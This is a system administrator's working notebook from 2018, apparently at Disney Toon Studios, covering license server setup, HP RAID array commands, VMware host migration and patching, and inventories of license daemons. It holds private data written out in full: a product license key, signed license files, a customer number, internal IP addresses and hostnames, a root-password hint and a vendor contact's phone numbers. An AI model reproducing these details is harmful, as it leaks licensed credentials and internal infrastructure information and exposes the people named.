Sign in to the Code42 administration console.
Select Subscriptions from the left navigation menu.

Version 5.4 and earlier:

Activate new or renewal licenses that have been purchased using the product license key below:

PROe User Subscription NYR
GxzrVF29zO4DtgeAZb/7PsShB22jhrPWkxC0ZG6JjErXWbUO
6ePSw4p3sSGtbR7vYtW/p3OWz1r+MTJpKZBcLg==

1. Sign in to the Code42 administration console.
2. Go to Licensing, then select Add Product License Key from the action menu in the upper-right.
3. Paste your new product license key and click Save.

******************************************************************************************************
19Jan18  speedtree floating license

@@@ email from Speedtree

Dear Colleen,

Thanks for licensing SpeedTree Cinema!

Two files are attached. Copy both of them to the same directory where the
rlm binary resides (the end-user bundle directory should have it if you are
not already running an RLM server).

Then, run the rlm binary. You should see a number of start-up prints,
including one that indicates that it is using the new .lic file. You can
administrate the license server by directing a web browser to the address
"hostname:5054", where hostname is the name of the license server. If it
indicates that the host name is incorrect, it can be changed in the .lic
file without invalidating the license.

Once RLM is running with the license, all that remains is to make each
installation of the SpeedTree Modeler aware of the license server. The
easiest way to do that is to copy the .lic file into the directory where the
SpeedTree Modeler executable resides. Alternatively, you can copy the
contents of the .lic file into the "Enter license code from IDV here:" edit
box in the Modeler's "Licensing Info" dialog. The Modeler uses the first
line of the file to find the license server and check out a license.

Assuming everything went to plan, you should now be up and running. Please
let us know, at support@speedtree.com, if you have any issues with this
process or any questions in general about SpeedTree.

Regards,

Kevin Meredith
Director, Business Development
IDV, Inc. and SpeedTreeR
5446 Sunset Blvd., Suite 201
Lexington, SC 29072
Office: (803) 356-1999, ext. 10
Mobile: (803) 446-9050
FAX: (803) 356-2129
www.speedtree.com
meredith@idvinc.com
Follow Us On Twitter


/usr/local/foundry/LicensingTools7.1/bin/RLM/idvinc.set
/usr/local/foundry/RLM/SpeedTree_Colleen_VanBuskirk__Disney_Toon_Studios.lic

 4982  25Jan18-09:12:32  cp SpeedTree_Colleen_VanBuskirk__Disney_Toon_Studios.lic SpeedTree_Colleen_VanBuskirk__Disney_Toon_Studios.lic-ORIG
 4983  25Jan18-09:12:36  ll
 4984  25Jan18-09:12:52  mv SpeedTree_Colleen_VanBuskirk__Disney_Toon_Studios.lic speetree.lic

25Jan18

@@@ Grace and I agree that this should have gone to dippertwo

for hostid command in email 18Jan18

Install the RLM bundle on the server machine. Then, run the following command:
 
"rlmutil rlmhostid ether"

@@@ as it turns out it HAS to go to dippertwo 

[root@dipper RLM]# less /usr/local/foundry/RLM/log/foundry.log
{SNIP}
01/25 09:26 (rlm) Starting ISV servers:
01/25 09:26 (rlm)     ... foundry on port 52283
01/25 09:26 (rlm)     ... idvinc on port 34627
(idvinc) Server settings (version 10) incompatible with RLM v9 software
(idvinc) This settings file must be used with RLM v10 (or later) software
{SNIP}

@@@ install a new version of RLM on dippertwo
@@@ dsiegfriedt@dts3329:~/JOBS/DISNEYTS/LICENSING/REPRISE-RLM

dsiegfriedt@dippertwo:~ $ cat /usr/genarts/rlm/speedtree.lic 
HOST dippertwo.disneytoonstudios.com 0050569c7b82 4102
ISV idvinc  
LICENSE idvinc speedtree_modeler_cinema 8.0 permanent 1 
  customer="Colleen VanBuskirk, Disney Toon Studios"
  issued=25-jan-2018 _ck=b1d6c1862f sig="60P04505Q4B6156KUV7NV49CTSA6P
  1VXA0N0BEG22G8WXX0HVRCGXKU7UTHGNUH1366471NEQ8"
LICENSE idvinc rlm_server_enable_vm 1.0 permanent 1 _ck=1fd6fc415f
  sig="60P0451PD9W9QQSBEY7GJR4QHN02DQJEGQMKVWR22H7DSPFRMPQW9FC83VY62NH
  D1NKT52SQ4C"




******************************************************************************************************
19Jan18  chug disks not showing up in pvs

@@@ install hp tool to look at raid controller

https://support.hpe.com/hpsc/swd/public/detail?swItemId=MTX_9a45caa3b8be46398c1bd4d016

[root@chug ~]# yum install /disney/home/dsiegfriedt/Downloads/hpacucli-9.40-12.0.x86_64.rpm 
Loaded plugins: changelog, langpacks, product-id, search-disabled-repos, subscription-manager
Examining /disney/home/dsiegfriedt/Downloads/hpacucli-9.40-12.0.x86_64.rpm: hpacucli-9.40-12.0.x86_64
Marking /disney/home/dsiegfriedt/Downloads/hpacucli-9.40-12.0.x86_64.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package hpacucli.x86_64 0:9.40-12.0 will be installed
--> Finished Dependency Resolution
dts-7-epel-rpms                                                               | 2.5 kB  00:00:00     

Dependencies Resolved

=====================================================================================================
 Package            Arch             Version              Repository                            Size
=====================================================================================================
Installing:
 hpacucli           x86_64           9.40-12.0            /hpacucli-9.40-12.0.x86_64            19 M

Transaction Summary
=====================================================================================================
Install  1 Package

Total size: 19 M
Installed size: 19 M
Is this ok [y/d/N]: y
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : hpacucli-9.40-12.0.x86_64                                                         1/1 

DOWNGRADE NOTE: To downgrade this application to any version prior to 9.10.x.x, the current RPM must be manually uninstalled using the "rpm -e" command before any prior versions can be installed.

LOCKING NOTE: The locking mechanism starting with versions 9.10.X.X, are not compatible with prior versions of the applications. Therefore, mixing older and newer versions of the various applications (ACU, HPACUCLI, HPACUSCRIPTING) is not recommended.

  Verifying  : hpacucli-9.40-12.0.x86_64                                                         1/1 

Installed:
  hpacucli.x86_64 0:9.40-12.0                                                                        

Complete!

@@@ cheatsheet
http://www.datadisk.co.uk/html_docs/redhat/hpacucli.htm

dmesg
{SNIP}
[12329477.115757] hpsa 0000:03:00.0: scsi 0:0:5:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[12329507.199807] hpsa 0000:03:00.0: scsi 0:0:6:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[12329507.199812] hpsa 0000:03:00.0: scsi 0:0:7:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0
[12329537.283710] hpsa 0000:03:00.0: scsi 0:0:8:0: masked Direct-Access     ATA      LK0480GFJSK      PHYS DRV SSDSmartPathCap- En- Exp=0

@@@ I think these are the 4 drives I added

https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-c03510253

@@@ need downtime on chug for this

NOT SO FAST.... BigG to the rescue... see 23Jan18
******************************************************************************************************
19Jan18  boot DL380G9 fro USB stick

https://support.hpe.com/hpsc/doc/public/display?docId=c04565930

******************************************************************************************************
23Jan18  Grace HP docs

/disney/home/gracet/docs/hp/

[root@dts3329 ~]# cat /disney/home/gracet/docs/hp/array_commands 

rpm -ivh ~/gracet/hpssacli-2.40-13.0.x86_64.rpm

Show configuration
/opt/hp/hpssacli/bld/hpssacli ctrl all show config

Controller status
/opt/hp/hpssacli/bld/hpssacli ctrl all show status

Show detailed controller information for all controllers
/opt/hp/hpssacli/bld/hpssacli ctrl all show detail

Show detailed controller information for controller in slot 0
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 show detail

Rescan for New Devices
/opt/hp/hpssacli/bld/hpssacli rescan

Physical disk status
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 pd all show status

Show detailed physical disk information
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 pd all show detail

Logical disk status
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld all show status

View Detailed Logical Drive Status
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld 2 show

Create New RAID 0 Logical Drive
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 create type=ld drives=1I:1:2 raid=0

Create New RAID 1 Logical Drive
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 create type=ld drives=1I:1:1,1I:1:2 raid=1

Create New RAID 5 Logical Drive
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 create type=ld drives=1I:1:1,1I:1:2,2I:1:6,2I:1:7,2I:1:8 raid=5

Delete Logical Drive
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld 2 delete

Add New Physical Drive to Logical Volume
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld 2 add drives=2I:1:6,2I:1:7

Add Spare Disks
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 array all add spares=2I:1:6,2I:1:7

Enable Drive Write Cache
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 modify dwc=enable

Disable Drive Write Cache
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 modify dwc=disable

Erase Physical Drive
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 pd 2I:1:6 modify erase

Turn on Blink Physical Disk LED
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld 2 modify led=on

Turn off Blink Physical Disk LED
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld 2 modify led=off

Modify smart array cache read and write ratio (cacheratio=readratio/writeratio)
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 modify cacheratio=100/0

Enable smart array write cache when no battery is present (No-Battery Write Cache option)
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 modify nbwc=enable

Disable smart array cache for certain Logical Volume
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 logicaldrive 1 modify arrayaccelerator=disable

Enable smart array cache for certain Logical Volume
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 logicaldrive 1 modify arrayaccelerator=enable

Enable SSD Smart Path
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 array a modify ssdsmartpath=enable

Disable SSD Smart Path
/opt/hp/hpssacli/bld/hpssacli ctrl slot=0 array a modify ssdsmartpath=disable

@@@ 23Jan18
@@@ stole from Grace and changed bin to bld because that is the path on chug

[root@chug ~]# /opt/hp/hpssacli/bld/hpssacli ctrl slot=0 create type=ld drives=1I:3:3,1I:3:4,2I:3:7,2I:3:8 raid=5

Warning: SSD Over Provisioning Optimization will be performed on the physical
         drives in this array. This process may take a long time and cause this
         application to appear unresponsive. Continue? (y/n)y

[root@chug ~]# /opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld all show status

   logicaldrive 1 (93.1 GB, 1): OK
   logicaldrive 2 (93.1 GB, 1): OK
   logicaldrive 3 (1.3 TB, 5): OK

[root@chug ~]# /opt/hp/hpssacli/bld/hpssacli ctrl all show config

Smart Array P440ar in Slot 0 (Embedded)   (sn: PDNLH0BRH7V7AL)


   Port Name: 1I

   Port Name: 2I

   Internal Drive Cage at Port 1I, Box 3, OK

   Internal Drive Cage at Port 2I, Box 3, OK
   array A (Solid State SATA, Unused Space: 0  MB)


      logicaldrive 1 (93.1 GB, RAID 1, OK)

      physicaldrive 1I:3:1 (port 1I:box 3:bay 1, Solid State SATA, 100 GB, OK)
      physicaldrive 1I:3:2 (port 1I:box 3:bay 2, Solid State SATA, 100 GB, OK)

   array B (Solid State SATA, Unused Space: 0  MB)


      logicaldrive 2 (93.1 GB, RAID 1, OK)

      physicaldrive 2I:3:5 (port 2I:box 3:bay 5, Solid State SATA, 100 GB, OK)
      physicaldrive 2I:3:6 (port 2I:box 3:bay 6, Solid State SATA, 100 GB, OK)

   array C (Solid State SATA, Unused Space: 0  MB)


      logicaldrive 3 (1.3 TB, RAID 5, OK)

      physicaldrive 1I:3:3 (port 1I:box 3:bay 3, Solid State SATA, 480.1 GB, OK)
      physicaldrive 1I:3:4 (port 1I:box 3:bay 4, Solid State SATA, 480.1 GB, OK)
      physicaldrive 2I:3:7 (port 2I:box 3:bay 7, Solid State SATA, 480.1 GB, OK)
      physicaldrive 2I:3:8 (port 2I:box 3:bay 8, Solid State SATA, 480.1 GB, OK)


 9671  23Jan18-13:47:44  hpssacli ctrl all show config
 9672  23Jan18-13:48:51  hpssacli ctrl all show detail
 9673  23Jan18-13:49:35  df
 9674  23Jan18-13:49:37  df -h
 9675  23Jan18-14:59:26  /opt/hp/hpssacli/bin/hpssacli ctrl all show status
 9676  23Jan18-14:59:43  ll /opt/hp
 9677  23Jan18-14:59:53  ll /opt/hp/hpssacli/
 9678  23Jan18-14:59:57  ll /opt/hp/hpssacli/bld/
 9679  23Jan18-15:00:26  /opt/hp/hpssacli/bld/hpssacli ctrl all show status
 9680  23Jan18-16:48:34  /opt/hp/hpssacli/bld/hpssacli ctrl slot=0 pd all show status
 9681  23Jan18-16:54:45  /opt/hp/hpssacli/bld/hpssacli ctrl slot=0 create type=ld drives=1I:3:3,1I:3:4,2I:3:7,2I:3:8 raid=5
 9682  23Jan18-16:55:47  /opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld all show status
 9683  23Jan18-16:55:56  df -h
 9684  23Jan18-16:56:04  pvdisplay
 9685  23Jan18-16:56:19  /opt/hp/hpssacli/bld/hpssacli ctrl slot=0 ld all show status
 9686  23Jan18-16:58:58  /opt/hp/hpssacli/bld/hpssacli ctrl all show config

[root@chug ~]# pvs
  PV         VG   Fmt  Attr PSize  PFree 
  /dev/sda2  myvg lvm2 a--  92.64g 60.00m
  /dev/sdb1  myvg lvm2 a--  93.12g     0 
  /dev/sdc1  myvg lvm2 a--   1.31t  1.31t

[root@chug ~]# vgdisplay
  --- Volume group ---
  VG Name               myvg
  System ID             
  Format                lvm2
  Metadata Areas        3
  Metadata Sequence No  8
  VG Access             read/write
  VG Status             resizable
  MAX LV                0
  Cur LV                3
  Open LV               3
  Max PV                0
  Cur PV                3
  Act PV                3
  VG Size               1.49 TiB
  PE Size               4.00 MiB
  Total PE              390927
  Alloc PE / Size       47540 / 185.70 GiB
  Free  PE / Size       343387 / 1.31 TiB
  VG UUID               ebgLgm-y9ZJ-q51h-OlIk-T0mM-1tbP-oAFAK9

******************************************************************************************************
25Jan18  install RLM on dippertwo

mkdir /usr/rlm

cd /usr/rlm

 [root@dippertwo rlm]# pwd
/usr/rlm

[root@dippertwo rlm]# ll
total 5384
-rw-r--r--. 1 root root     459 Jan 25 10:59 demo.set
-rw-r--r--. 1 root root     516 Jan 25 10:59 README
-rwxr-xr-x. 1 root root 2125096 Jan 25 10:59 rlm
-rwxr-xr-x. 1 root root 1344784 Jan 25 10:59 rlmanon
-rwxr-xr-x. 1 root root  651328 Jan 25 10:59 rlmtests
-rwxr-xr-x. 1 root root 1370456 Jan 25 10:59 rlmutil
-r--r--r--. 1 root root      81 Jan 25 10:59 VERSION

/disney/home/dsiegfriedt/JOBS/DISNEYTS/LICENSING/REPRISE-RLM

@@@ created /etc/init.d/rlm-server copied from PDF

[root@dippertwo init.d]# cat rlm-server
#! /bin/sh
#
# rlm Start/Stop rlm
#
rlmuser=root
rlmdir=/usr/rlm/rlm
rlmdowndir=$rlmdir
licfile=$rlmdir/speedtree.lic
debuglog=+$rlmdir/rlm.dl
#----------------------------------------------------------------
#----------------------------------------------------------------
start() {
echo $debuglog
        su - $rlmuser -c "$rlmdir/rlm -c $licfile -dlog $debuglog &"
}
stop() {
        su - $rlmuser -c "$rlmdowndir/rlmdown RLM -q"
}
case "$1" in
  start)
       start
       ;;
  stop)
      stop


      ;;
  restart)
      stop
      sleep 2
      start
      ;;
 *)
 echo $"Usage: $0 {start|stop|restart}"
          exit 1
esac

exit 0

@@@ new lic

[root@dippertwo rlm]# cat speedtree.lic 
HOST dippertwo 0050569c7b82
ISV idvinc  
LICENSE idvinc speedtree_modeler_cinema 8.0 permanent 1 
  customer="Colleen VanBuskirk, Disney Toon Studios"
  issued=25-jan-2018 _ck=b1d6c1862f sig="60P04505Q4B6156KUV7NV49CTSA6P
  1VXA0N0BEG22G8WXX0HVRCGXKU7UTHGNUH1366471NEQ8"
LICENSE idvinc rlm_server_enable_vm 1.0 permanent 1 _ck=1fd6fc415f
  sig="60P0451PD9W9QQSBEY7GJR4QHN02DQJEGQMKVWR22H7DSPFRMPQW9FC83VY62NH
  D1NKT52SQ4C"

@@@ started by hand on dippertwo

@@@/usr/rlm/rlm -c /usr/rlm/speedtree.lic -dlog /usr/rlm/rlm-speedtree.log

/usr/rlm/rlm -c /usr/rlm/Colleen_VanBuskirk__Disney_Toon_Studios_2.lic -dlog /usr/rlm/rlm-speedtree.log

/usr/rlm/rlm -g speedtree /usr/rlm/idvinc.set -s 6 -p "/usr/rlm/rlm"

@@@ open a browser

dippertwo:5054

Activate License
  enter hostid (FROM lic file)
  fix path to lic file
  
@@@ the secret to get both to run (sapphire and speedtree) is the port number "-ws"

http://www.reprisesoftware.com/admin/software-licensing-faq.php

The web server port defaults to 5054 (or 9000 in older releases), and can be changed on the rlm command line 
with "-ws ". Or the web server can be disabled altogether with "-nows", but we don't recommend disabling it. 

If you want to run one rlm for multiple ISV servers: 

This is the easiest way to configure rlm. 

You'll need (at least) 1 client connection port and 1 web server port. Note that you can use one or multiple 
client connection ports. rlm listens for client connections on each unique port it finds on the HOST or SERVER 
line of the license files it reads. RLM does this so that you can add a new license file from a new ISV without 
having to change it, and the client software from the new ISV is then unaware that the rlm process is serving 
other ISVs licenses. 

The easiest way to accomplish this is to put the license files and ISV servers in the same directory as rlm, 
and then just start rlm with its normal defaults. 

If you want to run one rlm per ISV server for 2 ISVs: 

You'll need 2 client connection ports and 2 web server ports. This means you will have to ensure that both 
license files specify different port numbers on the HOST (or SERVER) line, and you must be sure to start at 
least one copy of rlm with the "-ws port" option, specifying a different port # than the default. 

In this case, you must keep the license files in separate directories, or at a minimum, keep them in a 
directory that is separate from any of the rlm binaries and reference them with a "-c license_file" 
specification for each copy of rlm.

@@@ with that said
@@@ restart sapphire licesne server then

/usr/rlm/rlm -ws 4102 -c /usr/rlm/speedtree.lic -dlog /usr/rlm/rlm-speedtree.log

29Jan18
@@@ so I figured out how to get multiple different RLM services to run to gether

1) in the license file (after the hostid) add a port number
2) in the startup script add -ws <port number>
3) start normally

******************************************************************************************************
26Jan18  final draft email

Customer Number:         XFDZ-4IY6-SHA3-VGKC-UEQJ
 
Installer:                              http://www.finaldraft.com/install
 
Just follow the steps at the link for installation/activation for each user. We do offer support for mass deployment. 
Details can be found at this link:

https://finaldraft.box.com/s/kmwi1oedqp6csykm9xn3hfyqa7jjbskz

******************************************************************************************************
19Mar18  ESXi network commands
https://communities-gbot.vmware.com/thread/187557

@@@ list of NICs
esxcfg-nics -l

esxcli network nic list

esxcli network ip interface list

esxcfg-info
vim-cmd hostsvc/net/info | grep "mac ="


@@@ DHCP status  ALSO same as ifconfig for esxi
esxcli network ip interface ipv4 get

vSphere has a 5 minute lockout when trying to log in.
******************************************************************************************************
31Jan18   move a host from RHEVM to VMWare

@@@ this is based on roper

rm fiber
   this includes changing out the SFPs as that are for fabric
   	Have Joel give 2 (non port channeled 10G ports on the core)
   run 2 homeruns from host to core switch
   rm mgmt2 and <hostname2> ethernet cables
   *** this host was going to be HA for vcsa and it needed a connection to 204/5 ***
   check that the network connection you add are active
     vcsa -> <hostname> -> Configure (tab) -> Networking -> Physical Adapters @@@ should see "Actual Speed" indications
   vmnic0 should be a standard connection
   vmnic[4-5] should be the fiber (10G) connection

@@@ we are trying to match what is configured on vsphere-prod-01

@@@ go to https://docs.google.com/spreadsheets/d/1q-jw9TxCWfqiy5kq2ZBcxx15xP4mgn18IkiohGhD0mQ/edit?ts=589a0601#gid=584364967
@@@ and collect (edit) for IPs in the same subnets as vsphere-prod-01
@@@ Prod DSwitch/vmkernal/distributed port group 
@@@ for roper it was
@@@ 10.106.238.239  roper vmkernel vswitch0
    		    NM = 255.255.252.0
@@@ 10.106.235.78   roper					### DMZ (not for all hosts)
    		    NM = 255.255.255.0
@@@ 10.106.231.212 roper storage port group 			### Prod Dswitch
    		    NM = 255.255.252.0

@@@ roper							### for name

esxi host profile

vcsa => select host (roper in this case)
     RT click


home > roper > Host Profiles > Check Host Profile Compliance > 


DTS Prod Profile > Monitor > Compliance > roper
===============================================
FAILED   nothink in networks or datastores
===============================================

RT click -- Host Profiles -- Remediate...
   	    	 	     Check Host Profile Compliance
			     Change Host Profile
			     Attach Host Profile
			     Extract Host Profile

clicked Pre-check remediation

Remediation cannot start due to an error:

A general system error occured:

The vmnic device at PCI bus address s00000002.00 is not present on your host. You must shut down and then insert a card into PCI slot 2.  The type of card should exactly match the one in the reference host.

@@@ 4:50PM I think this may be a gen7 v gen9 problem.  Just want to get it out there with a time

@@@ Detach host profile

attach host profile
   DTS Prod Profile (because this machine has a DMZ connection)  [other hosts wont and will use "DTS Prod w/o DMZ network"]
   Next
!!! see IPs above

Attach
Check Host Profile Compliance

Configure // Host Profile // "DTS Prod Profile" // Monitor // Compliance 

--- gives you list of errors ---

@@@ 5:07PM

******************************************************************************************************
6Feb18  adding swapfile to vmcodadb1

https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/s1-swap-adding

dd if=/dev/zero of=/swapfile bs=1024 count=10485760       #10G
chmod 0600 /swapfile
mkswap /swapfile
vim /etc/fstab
    /swapfile               swap                    swap    defaults        0 0
swapon /swapfile
free

******************************************************************************************************
8Feb18   isi commands

@@@ isilon model number (all nodes in cluster)
isi_for_array -s isi_hw_status | grep -i prod

@@@ event log
isi events list -C -w

******************************************************************************************************
8Feb18

Removed ned from RHEV It had been in main mode since 1Feb18.  De-cable ing and getting ready to rebuild it into an ESXi server and add it to the VMWare cluster

(((((*****)))))
15Mar18
ESXi build default root passwd = K...

@@@ NOTE Raritan keybord stick on of the characters

(((((*****)))))

@@@ add a host to the cluster
 Production Cluster
  Add a host...

@@@ STOLEN from gracet/docs/setup-network  TY Grace!!!!!

Go to Network Icon -> DTS -> Prod Dswitch -> Right Click -> Add/Manage Host Networkin 
Add Hosts -> New Host -> vsphere-prod-04 
Check Manage Physical Adapters 
Assign uplink (Choose the 10Gb ports. You can confirm this by selecting the Port (ie: vmnic5) then clicking View Settings. Select the tab CDP (Cisco Discovery Protocol) and confirm that IP Address is 10.106.231.254 

@@@ if you don't have the correct IP (it means you are not in the correct port group)  Ask Joel to re-configure the ports to the correct port group.
@@@ one for each of the 2 fibers

Map the Uplinks to the same vmnic port (ie: vmni4 = Uplink 4) 
Click Next. Finish 

Add vMKernel 

Right Click Prod  -> Add/Manage Host networking
  Select Manage Host networking (NEXT)
  Click Attached Hosts -> <hostname> 
  Check Manage VMkernel Adapter 
  Click New Adapter 
Select Existing Network -> Storage PortGroup
Port Properties: Enable: vMotion and Management
Asisgn IP, gateway and dns. Select next until finish

Note that Data Portgroup (VM Network) is already part of DvSwitch so further configuration is needed

16Feb18  mounting datastores to new host

select new host
select storage tab (looks like stacked pucks above vcsa.disneytoonstudios.com)
@@@ look at similar host (for ned I looked at roper)
For each datastore select "<the list>" Right click and select "Mount Datastore to additional Hosts...."
checkbox of the host you want to mout that datastore to

<the list> = Corollary Backups DS, nest-dev, nest-prod, and theorem-iso

******************************************************************************************************
14Feb18  Raritan  *** ONLY from safari on Mac ***

10.103.80.254
login: admin or root (listed in users)
passwd:????

******************************************************************************************************
14Feb18 patching ned (vmware hosts)   @@@ +> Next

https://pubs.vmware.com/vsphere-51/index.jsp#com.vmware.vsphere.update_manager.doc/GUID-9E9D146E-40BB-4BB5-8FC6-C9CD735C0F11.html

vcsa
select host
  host to maintenance
    Update Manager (TAB)
      {Admin Mode}  Right hand side
        Manage
          Hosts Baseline
	    compliance view
	      Attach Baseline (start with Critical)
	        Stage Patches check "Critical Host Patches" +> select hosts (ned) +> +> Finish
		  Remediate +> +> +> +> +> +> +> Finish

FAILED patches missing from Download :^(

====================================================
@@@ may be an easier way

click vcsa (top/site level)

click Getting Started (tab)
      Click Download patches and upgrades

fails remediation....
The operation is not supported on the selected Inventory objects.  Check the events for the objects selected for the operation. 

https://kb.vmware.com/s/article/1024331
	says.... take it out of HA (NOT in HA)


******************************************************************************************************
14Feb18  down/up load patches

DOWNLOAD:
https://my.vmware.com/group/vmware/patch#search

MV to:
/disney/depts/tech/syseng/vmware/Patches

upload:
vcsa => select top level (site) => Patch Repository => "Import Patches" => Browse (/ifs/data/disney/depts...) => select => Open => Next => Finish

Repeat till all zips are in place

@@@ 15Feb18 put on hold 

******************************************************************************************************
15Feb18  ned notes in NOTES-VMWARE
******************************************************************************************************
20Feb18  coda

@@@ looking for service that were not running.... 
lists are edited

[root@vmcoda ~]# rpm -qa | grep coda
coda-client-5.1.1.77.gb4db917-1.wdas.el7.x86_64
python-coda-5.1.1.77.gb4db917-1.wdas.el7.x86_64
coda-utils-5.1.1.77.gb4db917-1.wdas.el7.x86_64
coda-server-5.1.1.77.gb4db917-1.wdas.el7.x86_64
coda-debuginfo-5.1.1.77.gb4db917-1.wdas.el7.x86_64
coda-libs-5.1.1.77.gb4db917-1.wdas.el7.x86_64

[root@vmcoda ~]# rpm -ql coda-client-5.1.1.77.gb4db917-1.wdas.el7.x86_64
/usr/lib/systemd/system/rclientd.service

[root@vmcoda ~]# rpm -ql coda-utils-5.1.1.77.gb4db917-1.wdas.el7.x86_64
/usr/lib/systemd/system/msgstat.service

[root@vmcoda ~]# rpm -ql coda-server-5.1.1.77.gb4db917-1.wdas.el7.x86_64
/usr/lib/systemd/system/rdispatcher.service
/usr/lib/systemd/system/rgoferd.service
/usr/lib/systemd/system/rqinfod.service


@@@ long story short
Grace rebooted vmcoda and it works....

@@@ Amy's test command (on vmcoda) = rjobs -a

[root@vmcoda ~]# rjobs -a
Job ID            Spec  User       Title                                          Status PEND  RUN SUSP EXIT KILL DONE Submitted / Run Time 
----------------- ----- ---------- ----------------------------------------- ----------- ---- ---- ---- ---- ---- ---- --------------------

Totals -- Queued: 0 / Running: 0 / Suspended: 0


@@@ grace threw together a quick check from her notes

-rwxr-xr-x. 1 root root    118 Feb 20 09:59 check.sh
[root@vmcoda ~]# cat check.sh 
#!/bin/sh 

systemctl status rqinfod
systemctl status rdispatcher
systemctl status rgoferd
systemctl status reflector


******************************************************************************************************
20Feb18  renew DHCP lease on a Mac

https://apple.stackexchange.com/questions/17401/how-can-i-release-and-renew-my-dhcp-lease-from-terminal

alias renew="sudo ipconfig set en0 BOOTP && sudo ipconfig set en0 DHCP"

******************************************************************************************************
20Feb18  dipper licensing shite

open a terminial and type:
ssh dipper

@@@ it will ask for your passwd

@@@ listings are edited to JUST what I am looking for.

ll /etc/init.d/
lrwxrwxrwx. 1 root root     5 Nov 17  2015 Clarisse -> ilise
-rwxr-xr-x. 1 root root  3068 Jul 29  2015 foundryflexlmserver
-rwxr-xr-x. 1 root root  2983 Jul 29  2015 foundryrlmserver
-rwxr-xr-x. 1 root root  1259 Aug 20  2015 ilise
-rwxr-xr-x. 1 root root  1363 Oct 31 10:01 MayaLicenseInitScript
-rwxr-xr-x. 1 root root  1559 Apr 14  2017 pixarlicenseserver
-rwxr-xr-x. 1 root root  2491 Oct  7  2015 pixologic_rlm
-rwxr-xr-x. 1 root root  5152 Mar 27  2017 sesinetd
-rwxr-xr-x. 1 root root  5152 Sep 10  2015 sesinetd.old
-rwxr-xr-x. 1 root root  1047 Jan 15  2016 vclicenseserver

@@@ the following command gives you the license server processes that are running....
@@@ if you run this you should see something VERY similar

[root@dipper flexnetserver]# ps -ef | grep lic
root      2853     1  0  2017 ?        00:00:43 /usr/local/tweak/bin/tlm_server -f /usr/local/tweak/etc/license.gto -log /scratch2/tlmserver.log

root      2922     1  0  2017 ?        00:10:00 /opt/videocopilot//server/vc_license_server -d -l /opt/videocopilot//server/license -ld /var/log/ -pd /var/run/

root      3436     1  0  2017 ?        00:04:16 /usr/pixologic/rlm/rlm -c /usr/pixologic/rlm/pixologic.lic -dlog /usr/pixologic/rlm/rlm-pixologic.log -ws 5073

root     14350     1  0 Feb01 ?        02:08:50 /opt/isotropix/ilise/ilise -license_folder /opt/isotropix/ilise/licenses

root     47937     1  0 Jan25 ?        00:01:00 /usr/local/foundry/LicensingTools7.1/bin/RLM/rlm.foundry -ws 4102 -c /usr/local/foundry/RLM/foundry.lic -dlog /usr/local/foundry/RLM/log/foundry.log

lmadmin  49526     1  0  2017 ?        00:02:57 /opt/flexnetserver/lmgrd -c /opt/flexnetserver/license.lic

lmadmin  49536 49526  0  2017 ?        00:13:58 adskflex -T dipper.disneytoonstudios.com 11.13 5 -c :/opt/flexnetserver/license.lic: -lmgrd_port 6979 -srv yLWsQMtZWh7wlYJfXlEA5Po4w7Cviae4aMBZupxJGurYBEfaf51n2mwvHEDsBXL -daemon_port 820 --lmgrd_start 59f76f7d -vdrestart 0

&&&&&

[root@dipper usr]# ll /usr
total 180
drwxr-xr-x.   4 root root  4096 Nov  1  2016 autodesk
drwxr-xr-x.   3 root root  4096 Oct  7  2015 pixologic

[root@dipper usr]# ll /usr/local/
drwxrwxrwx.  7 root root 4096 Oct  7  2016 foundry

@@@ to list licenses that are served by FLEXLM type:
/usr/local/foundry/LicensingTools7.1/bin/FLEXlm/lmutil lmstat -c /usr/local/foundry/FLEXlm/foundry.lic -a

@@@ to list licenses that are served by RLM type:
/usr/local/foundry/LicensingTools7.1/bin/RLM/rlmutil rlmstat -c /usr/local/foundry/RLM/foundry.lic -a

[root@dipper usr]# ll /usr/local/foundry/
total 20
drwxrwxrwx. 3 root root 4096 Dec  1 10:59 FLEXlm
drwxr-xr-x. 2 root root 4096 Dec  1 10:59 FLEXlm-ARCHIVE
drwxr-xr-x. 4 root root 4096 Jul 29  2015 LicensingTools7.1
drwxrwxrwx. 3 root root 4096 Feb  2 16:38 RLM
drwxr-xr-x. 2 root root 4096 Feb 16  2017 RLM-ARCHIVE


@@@ tweak = RV

lrwxrwxrwx.  1 root root    5 Aug 21  2015 tlm_server -> tweak
drwxrwxr-x. 10 root root 4096 Feb 27  2013 tweak

@@@ to check what tweak licenses we have type:
/usr/local/tweak/bin/tlm_server -s -h dipper -p 5436

@@@ tweak license live here:
[root@dipper usr]# ll /usr/local/tweak/etc
total 536
-rw-------. 1 root root 688128 Oct 28  2016 core.10547
-rw-r--r--. 1 root root  29689 Nov  6  2015 license.bak
-rw-r--r--. 1 root root   1626 Oct 28  2016 license.gto
